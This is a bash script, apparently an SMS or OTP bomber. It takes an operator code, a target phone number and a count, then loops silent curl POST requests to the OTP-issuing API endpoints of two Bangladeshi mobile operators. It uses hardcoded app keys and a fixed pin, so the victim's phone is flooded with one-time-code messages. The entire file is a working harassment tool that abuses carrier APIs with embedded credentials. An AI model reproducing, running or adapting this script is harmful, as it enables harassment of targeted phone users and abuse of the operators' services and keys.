#!/bin/bash
echo "Operator: $1; Target: $2; Amount: $3"
len=("$3")
p=("$2")
blpin(){
for i in $( eval echo {0..${len}} )
do
curl --silent --output /dev/null --location --request POST 'https://circle.happycell.mobi/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn=88'"${p}"'' --header 'x-app-key: 0skgg0ksg4880840w8w4gco0k4wckw0cg0w0w88s'
echo $i
done
}
rbpin(){
for i in $( eval echo {0..${len}} )
do
curl --silent --output /dev/null --location --request POST 'https://circle.robi.com.bd/mylife/appapi/appcall.php?op=getOTC&pin=19823&app_version=75&msisdn=88'"${p}"'' --header 'x-app-key: 000oc0so48owkw4s0wwo4c00g00804w80gwkw8kg'
echo $i
done
}

if [ ${1} == "bl" ]
then 
   blpin
elif [ ${1} == "rb" ]
then 
    rbpin
else
     echo "Invalid Arguement ${1}"
     exit 1
fi
